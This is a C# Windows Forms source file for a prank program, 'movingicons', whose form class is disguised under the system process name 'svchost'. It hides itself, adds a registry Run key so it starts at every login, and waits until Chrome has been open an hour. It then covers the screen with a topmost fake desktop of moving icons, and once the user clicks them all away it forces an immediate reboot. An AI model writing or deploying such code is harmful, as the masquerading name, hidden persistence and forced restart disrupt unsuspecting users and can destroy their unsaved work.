using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace movingicons
{
    public partial class svchost : Form
    {
        Random random = new Random();
        Timer startTimer = new Timer();
        public svchost()
        {
            InitializeComponent();
            this.DoubleBuffered = true;

            SetStyle(ControlStyles.ResizeRedraw, true);
            SetStyle(ControlStyles.UserPaint, true);
            SetStyle(ControlStyles.AllPaintingInWmPaint, true);
            SetStyle(ControlStyles.OptimizedDoubleBuffer, true);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.BeginInvoke(new Action(() =>
            {
                this.Hide();
            }));

            RegistryKey autostart = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);

            string progName = Process.GetCurrentProcess().ProcessName;
            autostart.SetValue("svchost_", Environment.CurrentDirectory + $"\\{progName}.exe");// в реестре системный svchost не дает добавить свой, поэтому переименовал
            autostart.Close();

            startTimer.Interval = 1000;
            startTimer.Tick += StartTimer_Tick;
            startTimer.Start();
        }

        private void StartTimer_Tick(object sender, EventArgs e)
        {
            if (Process.GetProcessesByName("chrome").Length == 0) return;

            if (DateTime.Now.Subtract(Process.GetProcessesByName("chrome")[0].StartTime).TotalHours >= 1)
            {
                startTimer.Stop();
                this.Start();
            }
        }

        private void Start()
        {
            this.Show();
            this.TopMost = true;
            this.FormBorderStyle = FormBorderStyle.None;
            this.WindowState = FormWindowState.Maximized;

            RegistryKey regKey = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop");
            string image = regKey.GetValue("Wallpaper").ToString();
            this.BackgroundImage = new Bitmap(image);
            regKey.Close();

            Point location = new Point(100, 0);
            foreach (string file in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)))
            {
                Icon icon = System.Drawing.Icon.ExtractAssociatedIcon(file);
                Button newButton = new Button();
                newButton.BackgroundImage = icon.ToBitmap();
                newButton.Size = icon.Size;
                newButton.Location = location;
                newButton.BackColor = Color.Transparent;
                newButton.FlatStyle = FlatStyle.Flat;
                newButton.FlatAppearance.BorderSize = 0;
                newButton.Click += Button_Click;
                location = new Point(random.Next(0, this.ClientSize.Width), random.Next(0, this.ClientSize.Height));
                this.Controls.Add(newButton);
            }

            Timer moveButtons = new Timer();
            moveButtons.Tick += MoveButtons_Tick;
            moveButtons.Interval = 400;
            moveButtons.Start();

            Timer checkButtons = new Timer();
            checkButtons.Interval = 100;
            checkButtons.Tick += CheckButtons_Tick;
            checkButtons.Start();
        }
        private void CheckButtons_Tick(object sender, EventArgs e)
        {
            if (this.Controls.Count == 0) Process.Start("shutdown", "/r /t 0");
        }


        private void Button_Click(object sender, EventArgs e)
            => this.Controls.Remove(sender as Button);

        private void MoveButtons_Tick(object sender, EventArgs e)
        {
            foreach (Button button in this.Controls)
            {
                button.Location = new Point(button.Location.X + random.Next(-50, 50), button.Location.Y + random.Next(-50, 50));

                if (button.Location.X < 0) button.Location = new Point(0, button.Location.Y);
                else if (button.Location.X + button.Width > this.ClientSize.Width) button.Location = new Point(this.ClientSize.Width - button.Width, button.Location.Y);
                if (button.Location.Y < 0) button.Location = new Point(button.Location.X, 0);
                else if (button.Location.Y + button.Height > this.ClientSize.Width) button.Location = new Point(button.Location.X, this.ClientSize.Height - button.Height);
            }
        }
    }
}
